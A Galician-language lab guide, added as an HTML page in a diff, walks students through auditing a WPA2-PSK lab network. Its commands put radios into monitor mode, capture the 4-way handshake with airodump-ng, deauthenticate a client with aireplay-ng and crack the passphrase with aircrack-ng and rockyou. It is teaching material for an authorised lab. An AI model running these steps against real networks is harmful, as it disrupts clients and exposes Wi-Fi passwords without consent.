@@ -1,0 +1,91 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica 1.1 — Auditoría WPA2-PSK</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica 1.1 — Auditoría WPA2-PSK</h1>
+<div class="notice important"><strong>Manual docente de referencia</strong>
+<p>Esta guía segue a práctica <strong><a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-1.pdf">1-Taller-HE-Practica-WiFi-1.pdf</a>{:target=&quot;_blank&quot;}</strong>. Os comandos execútanse na sesión gráfica do usuario <code>kali</code> da máquina virtual <code>vuln-wifi.lab</code>.</p>
+</div>
+<h2>Obxectivo</h2>
+<p>Identificar a rede WPA2-PSK de laboratorio <strong><code>EMPRESA-XYZ</code></strong>, capturar o intercambio de autenticación <em>4-way handshake</em> e comprobar, mediante un ataque de dicionario <strong>exclusivamente contra esta rede docente</strong>, como inflúe a fortaleza da frase de paso. A práctica reproduce o percorrido do PDF de referencia.</p>
+<h3>Organización das terminais</h3>
+<p>Traballaremos con <strong>dúas terminais</strong> abertas no escritorio Kali:</p>
+<ul>
+<li><strong>Terminal 1 — Observación e análise:</strong> inicia o escenario, identifica o AP, realiza a captura e proba o dicionario.</li>
+<li><strong>Terminal 2 — Desautenticación controlada:</strong> utilízase no apartado 4 para provocar a reconexión do cliente, mentres a Terminal 1 continúa capturando.</li>
+</ul>
+<p>As interfaces <code>wlan0</code> (AP) e <code>wlan1</code> (cliente) funcionan en <em>network namespaces</em>. Para a captura usaremos <code>wlan3</code>, visible desde Kali; para a proba de desautenticación, <code>wlan2</code>. <strong>O BSSID e a MAC do cliente deben obterse en cada execución</strong>, nunca copiarse dos exemplos.</p>
+<h2>1. Preparación do escenario (Terminal 1)</h2>
+<p>Arranca o laboratorio. O controlador desprega o AP lexítimo <code>EMPRESA-XYZ</code> e o cliente de probas:</p>
+<pre><code class="language-bash">sudo wifilabctl up psk
+sudo wifilabctl status
+</code></pre>
+<p>Comproba as interfaces do AP e do cliente:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_ap_wlan0 iw dev wlan0 info
+sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 info
+sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Se a última orde indica <code>Not connected</code>, agarda uns segundos e repítea. Anota o <strong>BSSID do AP</strong>, a <strong>MAC do cliente</strong> e a <strong>canle (6)</strong>.</p>
+<h2>2. Recoñecemento e modo monitor (Terminal 1)</h2>
+<p>Para non interferir co cliente nin co AP, utilizamos a interface de observación <code>wlan3</code>:</p>
+<pre><code class="language-bash">sudo ip link set wlan3 down
+sudo iw dev wlan3 set type monitor
+sudo ip link set wlan3 up
+sudo iw dev wlan3 set channel 6
+sudo iw dev wlan3 info
+</code></pre>
+<p>O resultado debe indicar <code>type monitor</code> e a canle 6. Identifica tamén o AP coa ferramenta de auditoría empregada no PDF:</p>
+<pre><code class="language-bash">sudo airodump-ng --channel 6 wlan3
+</code></pre>
+<p>Busca o ESSID <strong><code>EMPRESA-XYZ</code></strong> e contrasta o seu BSSID co obtido antes. Para saír de <code>airodump-ng</code>, preme <strong>Ctrl+C</strong>.</p>
+<h2>3. Captura do handshake (Terminal 1)</h2>
+<p>Inicia a captura sobre a rede de laboratorio. <strong>Substitúe <code>BSSID_AP</code> polo valor real anotado</strong> (por exemplo, <code>02:11:22:33:44:55</code>; ese valor é só ilustrativo):</p>
+<pre><code class="language-bash">sudo airodump-ng -c 6 --bssid BSSID_AP -w captura_psk wlan3
+</code></pre>
+<p>Deixa esta terminal aberta. O programa xerará ficheiros como <code>captura_psk-01.cap</code>. A captura continuará mentres utilizamos a segunda terminal.</p>
+<h2>4. Desautenticación controlada (Terminal 2)</h2>
+<p>Abre <strong>unha segunda terminal</strong>; <strong>non peches a Terminal 1</strong>. O obxectivo é forzar unha reconexión do cliente de laboratorio, que pode producir un novo handshake.</p>
+<p>Configura a radio de ataque <code>wlan2</code>:</p>
+<pre><code class="language-bash">sudo ip link set wlan2 down
+sudo iw dev wlan2 set type monitor
+sudo ip link set wlan2 up
+sudo iw dev wlan2 set channel 6
+</code></pre>
+<p>Usa exclusivamente o BSSID e a MAC do cliente identificados no apartado 1:</p>
+<pre><code class="language-bash">sudo aireplay-ng --deauth 1 -a BSSID_AP -c MAC_CLIENTE wlan2
+</code></pre>
+<p>Volve á <strong>Terminal 1</strong>. Se <code>airodump-ng</code> captura o intercambio, aparecerá unha indicación como <strong><code>WPA handshake: ...</code></strong>. Despois preme <strong>Ctrl+C</strong> para gardar a captura.</p>
+<div class="notice note"><strong>Como interpretar o resultado</strong>
+<p>O número de <code>ACKs</code> de <code>aireplay-ng</code> non demostra por si só que a desautenticación tivera éxito. Comproba a desconexión/reconexión do cliente e o PCAP. A <a href="1.2-ATAQUE_WPA2_PSK_DEAUTH.html">práctica 1.2 — Desautenticación sen PMF</a> amplía a análise das tramas e os efectos observados.</p>
+</div>
+<p>Para comprobar o estado de asociación:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Para visualizar as mensaxes EAPOL capturadas:</p>
+<pre><code class="language-bash">sudo tshark -r captura_psk-01.cap -Y eapol -T fields \
+  -e frame.number -e wlan.sa -e wlan.da \
+  -e wlan_rsna_eapol.keydes.msgnr
+</code></pre>
+<p>O resultado esperado é observar mensaxes do <em>4-way handshake</em>; poden existir retransmisións. Se non aparece ningunha, repetiremos a captura antes de continuar.</p>
+<h2>5. Proba de dicionario con Rockyou (Terminal 1)</h2>
+<p>O PDF orixinal continúa coa comprobación da robustez do contrasinal mediante <code>aircrack-ng</code>. Esta proba só debe realizarse contra a captura xerada polo escenario autorizado <code>psk</code>.</p>
+<p><strong>Paso 1. Preparar o dicionario.</strong> Se <code>rockyou.txt</code> está comprimido:</p>
+<pre><code class="language-bash">sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
+</code></pre>
+<p>Se xa existe <code>/usr/share/wordlists/rockyou.txt</code>, non é necesario descomprimilo novamente.</p>
+<p><strong>Paso 2. Executar a proba offline:</strong></p>
+<pre><code class="language-bash">sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura_psk-01.cap
+</code></pre>
+<p>No exemplo do manual pode aparecer <strong><code>KEY FOUND! [ spongebob19 ]</code></strong>. Este é un <em>resultado de referencia</em>, non unha saída garantida: depende de que o PCAP conteña un intercambio útil e de que a frase de paso estea no dicionario. A proba offline non envía novas peticións ao AP.</p>
+<h2>6. Evidencias e limpeza</h2>
+<p>Antes de limpar, anota:</p>
+<ol>
+<li>ESSID, BSSID e canle da rede de laboratorio.</li>
+<li>Estado de conexión do cliente antes e despois da proba.</li>
+<li>Confirmación da captura do handshake, preferentemente con mensaxes EAPOL.</li>
+<li>Resultado real de <code>aircrack-ng</code> (con independencia de que atope ou non unha clave).</li>
+</ol>
+<p>Ao rematar a práctica:</p>
+<pre><code class="language-bash">sudo wifilabctl reset
+</code></pre>
+<div class="notice tip"><strong>Seguinte práctica</strong>
+<p>Na <a href="1.2-ATAQUE_WPA2_PSK_DEAUTH.html">práctica 1.2</a> afondaremos especificamente na desautenticación e na análise de tramas. Na práctica 1.3 compararemos ese comportamento cun escenario con PMF requirido.</p>
+</div>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
